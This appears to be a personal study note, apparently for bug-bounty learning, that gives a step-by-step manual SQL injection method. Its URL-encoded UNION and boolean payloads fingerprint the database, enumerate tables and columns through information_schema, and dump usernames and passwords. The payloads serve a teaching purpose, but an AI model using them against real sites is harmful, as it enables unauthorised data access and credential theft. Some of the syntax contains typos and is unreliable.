First you need to know the basics of SQL go here -->  [[SQL Basic Commands ( using mysql )]]
To get SQL injection automated see [[SQLmap (Incomplete)]]

# Basic :
`%27`     -     '
`%23` or `-- (space)` `;--` or `;/*` or `;//`    -     for commenting out
always give a space in textboxes / URL's after `--` to comment rest
`/**/` or `+` - for spaces
`%20` - for space ( mostly used in Burp requests )

# Step 1 : Checking If its vulnerable 
If you see a login page or any page link which loads a different page 
do this :

### Inject a Normal Statement
 Inject a normal statement which website expects. Ex : `1`

### Inject a True Logical statement
Inject the same but followed by a **TRUE SQL Logical INJECTION** 
Ex : 
```SQL
1'+AND+1=1--
```
if the website displays the same thing as first one that means it is executing your SQL and is *vulnerable*

### Inject a False Logical statement
Now use the same input as used  but instead give a **FALSE Logical INJECTION** like : 
Ex: ```
```SQL
1'+AND+1=0--
```
and if the website gives an error then it is vulnerable to SQL injection
and if website doesn't give an error its vulnerable to **Blind SQL injection check below**

# Step 2 : Finding out number of columns and       columns being displayed

### To find number of columns 
Use the `order By` command to find how many columns are present
Ex : 
```SQL
1'oRder+bY+1--
``` 
and keep changing the number until the website crashes and you know how many columns are present
Ex : If website crashes at `ordEr+bY+4` then it has 3 columns

### To check which all columns are being displayed
 We can use `union select` to find which all are being displayed 
 Ex : 
```SQL
 1'UniOn+selecT+1,2,3--  
``` 
 ( assuming it has 3 columns )
 and check where 1 or 2 or 3 are being displayed on your screen, because some columns are not set to be displayed on the user's screen
( assuming 2nd column is being displayed )

### <span style ="color: red">If It dosen't work :</span>
1. Its probably using a different database and not mySQL to confirm if it is still vulnerable you can do : `1'UnIon+sElect+NULL,NULL,NULL-- ` => and the website should work normal

2. to find out which SQL version it is running first find which column is being displayed by injecting **strings** : `1'UnIon+Select+"a","b","c"-- ` ( assuming "b" is being displayed somewhere ) do : `1'UnION+SeLect+NULL,(Use all 4 version() commands)-- ` =>
   refer to this [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) 
   Ex : version() works so website is using **PostrgreSQL** , so use the cheatsheet and use those specific commands

# Step 3 : Finding all tables

**Note : There is a table called information_schema.tables which displays all the tables present in the database**

do : `1'Union+SeleCT+NULL,tabel_name,NULL+FrOm+information_schema.tables-- ` 
( Assuming we found a interesting table called **users** )

# Step 4 : Finding all Columns in that table
do :`1'UnIOn+select+NULL,column_name,NULL+from+information_schema.columns+Where+table_name='users'-- ` 
( Assuming we find 2 columns being `usernames` and `passwords` )
# Step 5 : reading the content
to see usernames : `1'Union+select+NULL,usernames,NULL+from+users`
to see passwords : `1'Union+select+NULL,password,NULL+from+users`

# <span style="color: orange">If Blind Injection found :</span>
Mostly injecting SQL statements will cause very minor change which is hard to notice
see **UDEMY-BUG-BOUNTY-ZSECURITY**

## <span style="color: orange">If TIME-BASED Injection found :</span>
Here unlike Blind there are little to none changes in the website
